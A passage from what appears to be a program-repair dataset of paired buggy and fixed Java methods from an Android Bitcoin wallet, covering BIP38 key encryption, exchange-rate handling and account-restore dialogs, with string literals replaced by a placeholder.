  WalletAccount account=Preconditions.checkNotNull(_mbwManager.getSelectedAccount());
  if (account instanceof ColuAccount) {
    btBuySell.setVisibility(View.GONE);
  }
 else {
    if (showButton) {
      btBuySell.setVisibility(View.VISIBLE);
      btBuySell.setOnClickListener(buySellOnClickListener);
    }
 else {
      btBuySell.setVisibility(View.GONE);
    }
  }
  View btBuySellRmc=_root.findViewById(R.id.btBuySellRMC);
  if (Calendar.getInstance().before(Keys.getICOEnd(getActivity()))) {
    btBuySellRmc.setOnClickListener(buySellRmcOnClickListener);
    _root.findViewById(R.id.btLearnMoreRMC).setOnClickListener(new OnClickListener(){
      @Override public void onClick(      View view){
        try {
          startActivity(Intent.parseUri(""String_Node_Str"",0));
        }
 catch (        URISyntaxException e) {
          e.printStackTrace();
        }
      }
    }
);
  }
 else {
    btBuySellRmc.setVisibility(View.GONE);
    _root.findViewById(R.id.btLearnMoreRMC).setVisibility(View.GONE);
  }
  super.onResume();
}","private void updateUi(){
  View btBuySell=_root.findViewById(R.id.btBuySellBitcoin);
  WalletAccount account=Preconditions.checkNotNull(_mbwManager.getSelectedAccount());
  if (account instanceof ColuAccount) {
    btBuySell.setVisibility(View.GONE);
  }
 else {
    if (showButton) {
      btBuySell.setVisibility(View.VISIBLE);
      btBuySell.setOnClickListener(buySellOnClickListener);
    }
 else {
      btBuySell.setVisibility(View.GONE);
    }
  }
}"
91180,"public static String encryptNoEcMultiply(byte[] stretcedKeyMaterial,InMemoryPrivateKey key,byte[] salt){
  int checksumLength=4;
  byte[] encoded=new byte[39 + checksumLength];
  int index=0;
  encoded[index++]=(byte)0x01;
  encoded[index++]=(byte)0x42;
  byte non_EC_multiplied=(byte)0xC0;
  byte compressedPublicKey=key.getPublicKey().isCompressed() ? (byte)0x20 : (byte)0;
  encoded[index++]=(byte)(non_EC_multiplied | compressedPublicKey);
  System.arraycopy(salt,0,encoded,index,salt.length);
  index+=salt.length;
  byte[] derivedHalf1=new byte[32];
  System.arraycopy(stretcedKeyMaterial,0,derivedHalf1,0,32);
  byte[] derivedHalf2=new byte[32];
  System.arraycopy(stretcedKeyMaterial,32,derivedHalf2,0,32);
  Rijndael aes=new Rijndael();
  aes.makeKey(derivedHalf2,256);
  byte[] complete=key.getPrivateKeyBytes();
  byte[] toEncryptPart1=new byte[16];
  for (int i=0; i < 16; i++) {
    toEncryptPart1[i]=(byte)((((int)complete[i]) & 0xFF) ^ (((int)derivedHalf1[i]) & 0xFF));
  }
  byte[] encryptedHalf1=new byte[16];
  aes.encrypt(toEncryptPart1,encryptedHalf1);
  System.arraycopy(encryptedHalf1,0,encoded,index,encryptedHalf1.length);
  index+=encryptedHalf1.length;
  byte[] toEncryptPart2=new byte[16];
  for (int i=0; i < 16; i++) {
    toEncryptPart2[i]=(byte)((((int)complete[16 + i]) & 0xFF) ^ (((int)derivedHalf1[16 + i]) & 0xFF));
  }
  byte[] encryptedHalf2=new byte[16];
  aes.encrypt(toEncryptPart2,encryptedHalf2);
  System.arraycopy(encryptedHalf2,0,encoded,index,encryptedHalf2.length);
  index+=encryptedHalf2.length;
  Sha256Hash checkSum=HashUtils.doubleSha256(encoded,0,39);
  byte[] start=checkSum.firstFourBytes();
  System.arraycopy(start,0,encoded,39,checksumLength);
  String result=Base58.encode(encoded);
  return result;
}","public static String encryptNoEcMultiply(byte[] stretcedKeyMaterial,InMemoryPrivateKey key,byte[] salt){
  int checksumLength=4;
  byte[] encoded=new byte[39 + checksumLength];
  int index=0;
  encoded[index++]=(byte)0x01;
  encoded[index++]=(byte)0x42;
  byte non_EC_multiplied=(byte)0xC0;
  byte compressedPublicKey=key.getPublicKey().isCompressed() ? (byte)0x20 : (byte)0;
  encoded[index++]=(byte)(non_EC_multiplied | compressedPublicKey);
  System.arraycopy(salt,0,encoded,index,salt.length);
  index+=salt.length;
  byte[] derivedHalf1=new byte[32];
  System.arraycopy(stretcedKeyMaterial,0,derivedHalf1,0,32);
  byte[] derivedHalf2=new byte[32];
  System.arraycopy(stretcedKeyMaterial,32,derivedHalf2,0,32);
  Rijndael aes=new Rijndael();
  aes.makeKey(derivedHalf2,256);
  byte[] complete=key.getPrivateKeyBytes();
  byte[] toEncryptPart1=new byte[16];
  for (int i=0; i < 16; i++) {
    toEncryptPart1[i]=(byte)((((int)complete[i]) & 0xFF) ^ (((int)derivedHalf1[i]) & 0xFF));
  }
  byte[] encryptedHalf1=new byte[16];
  aes.encrypt(toEncryptPart1,encryptedHalf1);
  System.arraycopy(encryptedHalf1,0,encoded,index,encryptedHalf1.length);
  index+=encryptedHalf1.length;
  byte[] toEncryptPart2=new byte[16];
  for (int i=0; i < 16; i++) {
    toEncryptPart2[i]=(byte)((((int)complete[16 + i]) & 0xFF) ^ (((int)derivedHalf1[16 + i]) & 0xFF));
  }
  byte[] encryptedHalf2=new byte[16];
  aes.encrypt(toEncryptPart2,encryptedHalf2);
  System.arraycopy(encryptedHalf2,0,encoded,index,encryptedHalf2.length);
  index+=encryptedHalf2.length;
  Sha256Hash checkSum=HashUtils.doubleSha256(encoded,0,39);
  byte[] start=checkSum.firstFourBytes();
  System.arraycopy(start,0,encoded,39,checksumLength);
  return Base58.encode(encoded);
}"
91181,"public static Bip38PrivateKey parseBip38PrivateKey(String bip38PrivateKey){
  byte[] decoded=Base58.decodeChecked(bip38PrivateKey);
  if (decoded == null) {
    return null;
  }
  if (decoded.length != 39) {
    return null;
  }
  int index=0;
  if (decoded[index++] != (byte)0x01) {
    return null;
  }
  boolean ecMultiply;
  if (decoded[index] == (byte)0x42) {
    ecMultiply=false;
  }
 else   if (decoded[index] == (byte)0x43) {
    ecMultiply=true;
  }
 else {
    return null;
  }
  index++;
  int flags=((int)decoded[index++]) & 0x00ff;
  boolean lotSequence;
  if (ecMultiply) {
    if ((flags | 0x0024) != 0x24) {
      return null;
    }
    lotSequence=(flags & 0x0004) == 0 ? false : true;
  }
 else {
    if ((flags | 0x00E0) != 0xE0) {
      return null;
    }
    if ((flags & 0x00c0) != 0x00c0) {
      return null;
    }
    lotSequence=false;
  }
  boolean compressed=(flags & 0x0020) == 0 ? false : true;
  byte[] salt=new byte[4];
  salt[0]=decoded[index++];
  salt[1]=decoded[index++];
  salt[2]=decoded[index++];
  salt[3]=decoded[index++];
  byte[] data=new byte[32];
  System.arraycopy(decoded,index,data,0,data.length);
  index+=data.length;
  return new Bip38PrivateKey(ecMultiply,compressed,lotSequence,salt,data);
}","public static Bip38PrivateKey parseBip38PrivateKey(String bip38PrivateKey){
  byte[] decoded=Base58.decodeChecked(bip38PrivateKey);
  if (decoded == null) {
    return null;
  }
  if (decoded.length != 39) {
    return null;
  }
  int index=0;
  if (decoded[index++] != (byte)0x01) {
    return null;
  }
  boolean ecMultiply;
  if (decoded[index] == (byte)0x42) {
    ecMultiply=false;
  }
 else   if (decoded[index] == (byte)0x43) {
    ecMultiply=true;
  }
 else {
    return null;
  }
  index++;
  int flags=((int)decoded[index++]) & 0x00ff;
  boolean lotSequence;
  if (ecMultiply) {
    if ((flags | 0x0024) != 0x24) {
      return null;
    }
    lotSequence=(flags & 0x0004) != 0;
  }
 else {
    if ((flags | 0x00E0) != 0xE0) {
      return null;
    }
    if ((flags & 0x00c0) != 0x00c0) {
      return null;
    }
    lotSequence=false;
  }
  boolean compressed=(flags & 0x0020) != 0;
  byte[] salt=new byte[4];
  System.arraycopy(decoded,index,salt,0,salt.length);
  index+=salt.length;
  byte[] data=new byte[32];
  System.arraycopy(decoded,index,data,0,data.length);
  return new Bip38PrivateKey(ecMultiply,compressed,lotSequence,salt,data);
}"
91182,"/** 
 * Perform BIP38 compatible password stretching on a password to derive the BIP38 key material
 * @throws InterruptedException
 */
public static byte[] bip38Stretch1(String passphrase,byte[] salt,SCryptProgress progressTracker,int outputSize) throws InterruptedException {
  byte[] derived;
  try {
    derived=SCrypt.scrypt(passphrase.getBytes(""String_Node_Str""),salt,SCRYPT_N,SCRYPT_R,SCRYPT_P,outputSize,progressTracker);
    return derived;
  }
 catch (  UnsupportedEncodingException e) {
    throw new RuntimeException(e);
  }
catch (  GeneralSecurityException e) {
    throw new RuntimeException(e);
  }
}","/** 
 * Perform BIP38 compatible password stretching on a password to derive the BIP38 key material
 */
public static byte[] bip38Stretch1(String passphrase,byte[] salt,SCryptProgress progressTracker,int outputSize) throws InterruptedException {
  byte[] derived;
  String normalizedPassphrase=Normalizer.normalize(passphrase,Normalizer.Form.NFC);
  try {
    derived=SCrypt.scrypt(normalizedPassphrase.getBytes(""String_Node_Str""),salt,SCRYPT_N,SCRYPT_R,SCRYPT_P,outputSize,progressTracker);
    return derived;
  }
 catch (  UnsupportedEncodingException|GeneralSecurityException e) {
    throw new RuntimeException(e);
  }
}"
91183,"public static String decryptNoEcMultiply(Bip38PrivateKey bip38Key,byte[] stretcedKeyMaterial,NetworkParameters network){
  byte[] derivedHalf1=new byte[32];
  System.arraycopy(stretcedKeyMaterial,0,derivedHalf1,0,32);
  byte[] derivedHalf2=new byte[32];
  System.arraycopy(stretcedKeyMaterial,32,derivedHalf2,0,32);
  Rijndael aes=new Rijndael();
  aes.makeKey(derivedHalf2,256);
  byte[] encryptedHalf1=new byte[16];
  System.arraycopy(bip38Key.data,0,encryptedHalf1,0,encryptedHalf1.length);
  byte[] encryptedHalf2=new byte[16];
  System.arraycopy(bip38Key.data,16,encryptedHalf2,0,encryptedHalf2.length);
  byte[] decryptedHalf1=new byte[16];
  aes.decrypt(encryptedHalf1,decryptedHalf1);
  byte[] decryptedHalf2=new byte[16];
  aes.decrypt(encryptedHalf2,decryptedHalf2);
  byte[] complete=new byte[32];
  for (int i=0; i < 16; i++) {
    complete[i]=(byte)((((int)decryptedHalf1[i]) & 0xFF) ^ (((int)derivedHalf1[i]) & 0xFF));
    complete[i + 16]=(byte)((((int)decryptedHalf2[i]) & 0xFF) ^ (((int)derivedHalf1[i + 16]) & 0xFF));
  }
  InMemoryPrivateKey key=new InMemoryPrivateKey(complete,bip38Key.compressed);
  Address address=key.getPublicKey().toAddress(network);
  byte[] newSalt=calculateScryptSalt(address);
  if (!BitUtils.areEqual(bip38Key.salt,newSalt)) {
    return null;
  }
  String result=key.getBase58EncodedPrivateKey(network);
  return result;
}","public static String decryptNoEcMultiply(Bip38PrivateKey bip38Key,byte[] stretcedKeyMaterial,NetworkParameters network){
  byte[] derivedHalf1=new byte[32];
  System.arraycopy(stretcedKeyMaterial,0,derivedHalf1,0,32);
  byte[] derivedHalf2=new byte[32];
  System.arraycopy(stretcedKeyMaterial,32,derivedHalf2,0,32);
  Rijndael aes=new Rijndael();
  aes.makeKey(derivedHalf2,256);
  byte[] encryptedHalf1=new byte[16];
  System.arraycopy(bip38Key.data,0,encryptedHalf1,0,encryptedHalf1.length);
  byte[] encryptedHalf2=new byte[16];
  System.arraycopy(bip38Key.data,16,encryptedHalf2,0,encryptedHalf2.length);
  byte[] decryptedHalf1=new byte[16];
  aes.decrypt(encryptedHalf1,decryptedHalf1);
  byte[] decryptedHalf2=new byte[16];
  aes.decrypt(encryptedHalf2,decryptedHalf2);
  byte[] complete=new byte[32];
  for (int i=0; i < 16; i++) {
    complete[i]=(byte)((((int)decryptedHalf1[i]) & 0xFF) ^ (((int)derivedHalf1[i]) & 0xFF));
    complete[i + 16]=(byte)((((int)decryptedHalf2[i]) & 0xFF) ^ (((int)derivedHalf1[i + 16]) & 0xFF));
  }
  InMemoryPrivateKey key=new InMemoryPrivateKey(complete,bip38Key.compressed);
  Address address=key.getPublicKey().toAddress(network);
  byte[] newSalt=calculateScryptSalt(address);
  if (!BitUtils.areEqual(bip38Key.salt,newSalt)) {
    return null;
  }
  return key.getBase58EncodedPrivateKey(network);
}"
91184,"private boolean checkIsRMCICOPaymentRequest(){
  return new RmcApiClient(_mbwManager.getNetwork()).isCallbackMine(_bitcoinUri.callbackURL);
}","private boolean checkIsRMCICOPaymentRequest(){
  return _bitcoinUri != null && _bitcoinUri.callbackURL != null && new RmcApiClient(_mbwManager.getNetwork()).isCallbackMine(_bitcoinUri.callbackURL);
}"
91185,"private void verify(InMemoryPrivateKey pk){
  Address address=pk.getPublicKey().toAddress(_mbwManager.getNetwork());
  UUID account=SingleAddressAccount.calculateId(address);
  boolean success=_mbwManager.getWalletManager(false).hasAccount(account) || _mbwManager.getColuManager().hasAccount(account);
  for (  ColuAccount.ColuAsset coluAsset : ColuAccount.ColuAsset.getAssetMap(_mbwManager.getColuManager().getNetwork()).values()) {
    UUID coluUUID=ColuAccount.getGuidForAsset(coluAsset,pk.getPublicKey().getPublicKeyBytes());
    success|=_mbwManager.getColuManager().hasAccount(coluUUID);
  }
  if (success) {
    _mbwManager.getMetadataStorage().setOtherAccountBackupState(account,MetadataStorage.BackupState.VERIFIED);
    for (    ColuAccount.ColuAsset coluAsset : ColuAccount.ColuAsset.getAssetMap(_mbwManager.getColuManager().getNetwork()).values()) {
      UUID coluUUID=ColuAccount.getGuidForAsset(coluAsset,pk.getPublicKey().getPublicKeyBytes());
      _mbwManager.getMetadataStorage().setOtherAccountBackupState(coluUUID,MetadataStorage.BackupState.VERIFIED);
    }
    updateUi();
    String message=getResources().getString(R.string.verify_backup_ok,address.toMultiLineString());
    ShowDialogMessage(message,false);
  }
 else {
    ShowDialogMessage(R.string.verify_backup_no_such_record,false);
  }
}","private void verify(InMemoryPrivateKey pk){
  Address address=pk.getPublicKey().toAddress(_mbwManager.getNetwork());
  UUID account=SingleAddressAccount.calculateId(address);
  boolean success=_mbwManager.getWalletManager(false).hasAccount(account) || _mbwManager.getColuManager().hasAccount(account);
  for (  ColuAccount.ColuAsset coluAsset : ColuAccount.ColuAsset.getAssetMap(_mbwManager.getColuManager().getNetwork()).values()) {
    UUID coluUUID=ColuAccount.getGuidForAsset(coluAsset,pk.getPublicKey().toAddress(_mbwManager.getNetwork()).getAllAddressBytes());
    success|=_mbwManager.getColuManager().hasAccount(coluUUID);
  }
  if (success) {
    _mbwManager.getMetadataStorage().setOtherAccountBackupState(account,MetadataStorage.BackupState.VERIFIED);
    for (    ColuAccount.ColuAsset coluAsset : ColuAccount.ColuAsset.getAssetMap(_mbwManager.getColuManager().getNetwork()).values()) {
      UUID coluUUID=ColuAccount.getGuidForAsset(coluAsset,pk.getPublicKey().toAddress(_mbwManager.getNetwork()).getAllAddressBytes());
      _mbwManager.getMetadataStorage().setOtherAccountBackupState(coluUUID,MetadataStorage.BackupState.VERIFIED);
    }
    updateUi();
    String message=getResources().getString(R.string.verify_backup_ok,address.toMultiLineString());
    ShowDialogMessage(message,false);
  }
 else {
    ShowDialogMessage(R.string.verify_backup_no_such_record,false);
  }
}"
91186,"public static UUID getGuidForAsset(ColuAsset coluAsset,byte[] publicKeyBytes){
  ByteWriter byteWriter=new ByteWriter(36);
  byteWriter.putBytes(publicKeyBytes);
  byteWriter.putRawStringUtf8(coluAsset.id);
  Sha256Hash accountId=HashUtils.sha256(byteWriter.toBytes());
  return getGuidFromByteArray(accountId.getBytes());
}","public static UUID getGuidForAsset(ColuAsset coluAsset,byte[] addressBytes){
  ByteWriter byteWriter=new ByteWriter(36);
  byteWriter.putBytes(addressBytes);
  byteWriter.putRawStringUtf8(coluAsset.id);
  Sha256Hash accountId=HashUtils.sha256(byteWriter.toBytes());
  return getGuidFromByteArray(accountId.getBytes());
}"
91187,"public UUID enableAsset(ColuAccount.ColuAsset coluAsset,InMemoryPrivateKey key){
  if (key != null && isAddressInUse(key.getPublicKey().toAddress(getNetwork())))   return null;
  if (key != null) {
    UUID uuid=ColuAccount.getGuidForAsset(coluAsset,key.getPublicKey().getPublicKeyBytes());
    if (coluAccounts.containsKey(uuid)) {
      return uuid;
    }
  }
  ColuAccount newAccount=createAccount(coluAsset,key);
  handler.post(new Runnable(){
    @Override public void run(){
      eventBus.post(new ExtraAccountsChanged());
    }
  }
);
  saveEnabledAssetIds();
  return newAccount.getId();
}","public UUID enableAsset(ColuAccount.ColuAsset coluAsset,InMemoryPrivateKey key){
  if (key != null && isAddressInUse(key.getPublicKey().toAddress(getNetwork())))   return null;
  if (key != null) {
    UUID uuid=ColuAccount.getGuidForAsset(coluAsset,key.getPublicKey().toAddress(getNetwork()).getAllAddressBytes());
    if (coluAccounts.containsKey(uuid)) {
      return uuid;
    }
  }
  ColuAccount newAccount=createAccount(coluAsset,key);
  handler.post(new Runnable(){
    @Override public void run(){
      eventBus.post(new ExtraAccountsChanged());
    }
  }
);
  saveEnabledAssetIds();
  return newAccount.getId();
}"
91188,"/** 
 * Get the exchange rate for the specified currency. <p/> Returns null if the current rate is too old In that the case the caller could choose to call refreshRates() and listen for callbacks. If a rate is returned the contained price may be null if the currently chosen exchange source is not available.
 */
@Override public synchronized ExchangeRate getExchangeRate(String currency){
  boolean rmcFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    currency=""String_Node_Str"";
    rmcFlag=true;
  }
  boolean ethFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    if (ethRate == 0)     return null;
    currency=""String_Node_Str"";
    ethFlag=true;
  }
  if (_latestRates == null || _latestRates.isEmpty() || !_latestRates.containsKey(currency)) {
    if (currency.equals(""String_Node_Str"")) {
      return getRMCExchangeRate(rmcFlag,ethFlag,new ExchangeRate(""String_Node_Str"",0,usdRate,""String_Node_Str""));
    }
    return null;
  }
  if (_latestRatesTime + MAX_RATE_AGE_MS < System.currentTimeMillis()) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  for (  ExchangeRate r : _latestRates.get(currency).exchangeRates) {
    if (r.name.equals(_currentExchangeSourceName)) {
      if (r.price.equals(0d)) {
        return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
      }
      r=getRMCExchangeRate(rmcFlag,ethFlag,r);
      return r;
    }
  }
  if (_currentExchangeSourceName != null) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  return null;
}","/** 
 * Get the exchange rate for the specified currency. <p/> Returns null if the current rate is too old In that the case the caller could choose to call refreshRates() and listen for callbacks. If a rate is returned the contained price may be null if the currently chosen exchange source is not available.
 */
@Override public synchronized ExchangeRate getExchangeRate(String currency){
  boolean rmcFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    currency=""String_Node_Str"";
    rmcFlag=true;
  }
  boolean ethFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    if (ethRate == 0)     return null;
    currency=""String_Node_Str"";
    ethFlag=true;
  }
  if (_latestRates == null || _latestRates.isEmpty() || !_latestRates.containsKey(currency)) {
    if (currency.equals(""String_Node_Str"") && (usdRate != null)) {
      return getRMCExchangeRate(rmcFlag,ethFlag,new ExchangeRate(""String_Node_Str"",0,usdRate,""String_Node_Str""));
    }
    return null;
  }
  if (_latestRatesTime + MAX_RATE_AGE_MS < System.currentTimeMillis()) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  for (  ExchangeRate r : _latestRates.get(currency).exchangeRates) {
    if (r.name.equals(_currentExchangeSourceName)) {
      if (r.price.equals(0d)) {
        return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
      }
      r=getRMCExchangeRate(rmcFlag,ethFlag,r);
      return r;
    }
  }
  if (_currentExchangeSourceName != null) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  return null;
}"
91189,"public void run(){
  try {
    List<QueryExchangeRatesResponse> responses=new ArrayList<QueryExchangeRatesResponse>();
    List<String> selectedCurrencies;
synchronized (_requestLock) {
      selectedCurrencies=new ArrayList<String>(_fiatCurrencies);
    }
    for (    String currency : selectedCurrencies) {
      responses.add(_api.queryExchangeRates(new QueryExchangeRatesRequest(Wapi.VERSION,currency)).getResult());
    }
synchronized (_requestLock) {
      setLatestRates(responses);
      _fetcher=null;
      notifyRefreshingExchangeRatesSucceeded();
    }
  }
 catch (  WapiException e) {
synchronized (_requestLock) {
      _fetcher=null;
      notifyRefreshingExchangeRatesFailed();
    }
  }
  if (rmcApiClient != null) {
    RmcApiClient rmcApiClient=new RmcApiClient(null);
    Float rate=rmcApiClient.exchangeUsdRmcRate();
    if (rate != null) {
      rmcRate=rate;
      getPreferences().edit().putFloat(USD_RMC,rmcRate).apply();
    }
    rate=rmcApiClient.exchangeEthUsdRate();
    if (rate != null) {
      ethRate=rate;
    }
  }
}","public void run(){
  try {
    List<QueryExchangeRatesResponse> responses=new ArrayList<QueryExchangeRatesResponse>();
    List<String> selectedCurrencies;
synchronized (_requestLock) {
      selectedCurrencies=new ArrayList<String>(_fiatCurrencies);
    }
    for (    String currency : selectedCurrencies) {
      responses.add(_api.queryExchangeRates(new QueryExchangeRatesRequest(Wapi.VERSION,currency)).getResult());
    }
synchronized (_requestLock) {
      setLatestRates(responses);
      _fetcher=null;
      notifyRefreshingExchangeRatesSucceeded();
    }
  }
 catch (  WapiException e) {
synchronized (_requestLock) {
      _fetcher=null;
      notifyRefreshingExchangeRatesFailed();
    }
  }
  if (rmcApiClient != null) {
    RmcApiClient rmcApiClient=new RmcApiClient(null);
    Float rate=rmcApiClient.exchangeUsdRmcRate();
    if (rate != null) {
      rmcRate=rate;
      getPreferences().edit().putFloat(USD_RMC,rmcRate).apply();
    }
    rate=rmcApiClient.exchangeEthUsdRate();
    if (rate != null) {
      ethRate=rate;
    }
    rate=rmcApiClient.exchangeBtcUsdRate();
    if (rate != null) {
      usdRate=rate;
    }
  }
}"
91190,"/** 
 * Get the exchange rate for the specified currency. <p/> Returns null if the current rate is too old In that the case the caller could choose to call refreshRates() and listen for callbacks. If a rate is returned the contained price may be null if the currently chosen exchange source is not available.
 */
@Override public synchronized ExchangeRate getExchangeRate(String currency){
  boolean rmcFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    currency=""String_Node_Str"";
    rmcFlag=true;
  }
  boolean ethFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    if (ethRate == 0)     return null;
    currency=""String_Node_Str"";
    ethFlag=true;
  }
  if (_latestRates == null || _latestRates.isEmpty() || !_latestRates.containsKey(currency)) {
    return null;
  }
  if (_latestRatesTime + MAX_RATE_AGE_MS < System.currentTimeMillis()) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  for (  ExchangeRate r : _latestRates.get(currency).exchangeRates) {
    if (r.name.equals(_currentExchangeSourceName)) {
      if (r.price.equals(0d)) {
        return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
      }
      if (rmcFlag) {
        r=new ExchangeRate(r.name,r.time,r.price * rmcRate,""String_Node_Str"");
      }
      if (ethFlag) {
        r=new ExchangeRate(r.name,r.time,r.price / ethRate,""String_Node_Str"");
      }
      return r;
    }
  }
  if (_currentExchangeSourceName != null) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  return null;
}","/** 
 * Get the exchange rate for the specified currency. <p/> Returns null if the current rate is too old In that the case the caller could choose to call refreshRates() and listen for callbacks. If a rate is returned the contained price may be null if the currently chosen exchange source is not available.
 */
@Override public synchronized ExchangeRate getExchangeRate(String currency){
  boolean rmcFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    currency=""String_Node_Str"";
    rmcFlag=true;
  }
  boolean ethFlag=false;
  if (currency.equals(""String_Node_Str"")) {
    if (ethRate == 0)     return null;
    currency=""String_Node_Str"";
    ethFlag=true;
  }
  if (_latestRates == null || _latestRates.isEmpty() || !_latestRates.containsKey(currency)) {
    if (currency.equals(""String_Node_Str"")) {
      return getRMCExchangeRate(rmcFlag,ethFlag,new ExchangeRate(""String_Node_Str"",0,usdRate,""String_Node_Str""));
    }
    return null;
  }
  if (_latestRatesTime + MAX_RATE_AGE_MS < System.currentTimeMillis()) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  for (  ExchangeRate r : _latestRates.get(currency).exchangeRates) {
    if (r.name.equals(_currentExchangeSourceName)) {
      if (r.price.equals(0d)) {
        return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
      }
      r=getRMCExchangeRate(rmcFlag,ethFlag,r);
      return r;
    }
  }
  if (_currentExchangeSourceName != null) {
    return ExchangeRate.missingRate(_currentExchangeSourceName,System.currentTimeMillis(),currency);
  }
  return null;
}"
91191,"@Override public void onClick(DialogInterface dialogInterface,int i){
  UUID account;
  if (i == 0) {
    account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
  }
 else {
    ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
    account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
  }
  finishOk(account);
}","@Override public void onClick(DialogInterface dialogInterface,int i){
  UUID account;
  if (selectedItem == 0) {
    account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
  }
 else {
    ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
    account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
  }
  finishOk(account);
}"
91192,"@Override protected void onPostExecute(UUID account){
  dialog.dismiss();
  if (account != null) {
    finishOk(account);
  }
 else   if (askUserForColorize) {
    final List<String> list=ColuAccount.ColuAsset.getAllAssetNames(_mbwManager.getNetwork());
    list.add(0,""String_Node_Str"");
    new AlertDialog.Builder(AddAdvancedAccountActivity.this).setTitle(R.string.restore_addres_as).setSingleChoiceItems(list.toArray(new String[list.size()]),0,new DialogInterface.OnClickListener(){
      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        selectedItem=i;
      }
    }
).setPositiveButton(R.string.button_ok,new DialogInterface.OnClickListener(){
      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        UUID account;
        if (i == 0) {
          account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
        }
 else {
          ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
          account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
        }
        finishOk(account);
      }
    }
).create().show();
  }
}","@Override protected void onPostExecute(UUID account){
  dialog.dismiss();
  if (account != null) {
    finishOk(account);
  }
 else   if (askUserForColorize) {
    final List<String> list=ColuAccount.ColuAsset.getAllAssetNames(_mbwManager.getNetwork());
    list.add(0,""String_Node_Str"");
    new AlertDialog.Builder(AddAdvancedAccountActivity.this).setTitle(R.string.restore_addres_as).setSingleChoiceItems(list.toArray(new String[list.size()]),0,new DialogInterface.OnClickListener(){
      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        selectedItem=i;
      }
    }
).setPositiveButton(R.string.button_ok,new DialogInterface.OnClickListener(){
      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        UUID account;
        if (selectedItem == 0) {
          account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
        }
 else {
          ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
          account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
        }
        finishOk(account);
      }
    }
).create().show();
  }
}"
91193,"@Override public void onClick(DialogInterface dialogInterface,int i){
  UUID account;
  if (i == 0) {
    account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
  }
 else {
    ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
    account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
  }
  finishOk(account);
}","@Override public void onClick(DialogInterface dialogInterface,int i){
  UUID account;
  if (selectedItem == 0) {
    account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
  }
 else {
    ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
    account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
  }
  finishOk(account);
}"
91194,"@Override protected void onPostExecute(UUID account){
  dialog.dismiss();
  if (account != null) {
    finishOk(account);
  }
 else   if (askUserForColorize) {
    final List<String> list=ColuAccount.ColuAsset.getAllAssetNames(_mbwManager.getNetwork());
    list.add(0,""String_Node_Str"");
    new AlertDialog.Builder(AddAdvancedAccountActivity.this).setTitle(R.string.restore_addres_as).setSingleChoiceItems(list.toArray(new String[list.size()]),0,new DialogInterface.OnClickListener(){
      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        selectedItem=i;
      }
    }
).setPositiveButton(R.string.button_ok,new DialogInterface.OnClickListener(){
      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        UUID account;
        if (i == 0) {
          account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
        }
 else {
          ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
          account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
        }
        finishOk(account);
      }
    }
).create().show();
  }
}","@Override protected void onPostExecute(UUID account){
  dialog.dismiss();
  if (account != null) {
    finishOk(account);
  }
 else   if (askUserForColorize) {
    final List<String> list=ColuAccount.ColuAsset.getAllAssetNames(_mbwManager.getNetwork());
    list.add(0,""String_Node_Str"");
    new AlertDialog.Builder(AddAdvancedAccountActivity.this).setTitle(R.string.restore_addres_as).setSingleChoiceItems(list.toArray(new String[list.size()]),0,new DialogInterface.OnClickListener(){
